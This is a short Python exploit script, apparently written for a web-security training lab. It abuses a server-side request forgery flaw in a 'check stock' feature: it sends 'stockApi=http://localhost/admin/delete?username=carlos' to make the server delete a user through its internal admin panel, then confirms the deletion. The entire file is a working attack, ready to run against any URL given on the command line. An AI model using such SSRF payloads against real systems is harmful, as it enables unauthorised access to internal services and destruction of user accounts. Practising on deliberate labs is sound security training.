import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#proxy localhost for Intercept the request
proxie={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

#delete function 
def delete_user(url):
    #path that delete user carlos
    delete_user_url_ssrf_payload= 'http://localhost/admin/delete?username=carlos'
    #parameter that send to serevr for check stockApi=http://localhost/admin
    check_stock_path='/product/stock'
    param= {'stockApi': delete_user_url_ssrf_payload}
    #request post methose url of web site plus param
    r=requests.post(url+check_stock_path,data=param,verify=False,proxies=proxie)
    #check user if deleted
    admin_ssrf_pyload='http://localhost/admin'
    param2 = {'stockApi': admin_ssrf_pyload}
    r=requests.post(url+check_stock_path,data=param2,verify=False,proxies=proxie)
    if 'User deleted successfully' in r.text:
         print("(+) Successfully deleted Carlos user!")
    else:
        print("(-) Exploit was unsuccessful.")

def main():
    #argumaent need for run the script 
    if len(sys.argv) !=2:
        print("(+) usage %s <url>"% sys.argv[0])
        print("(+) example : %s www.examlpe.ma" % sys.argv[0])
        sys.exit(-1)
    url=sys.argv[1]
    print("deliting progressing .....")
    delete_user(url)
    
if __name__ == '__main__':
    main()

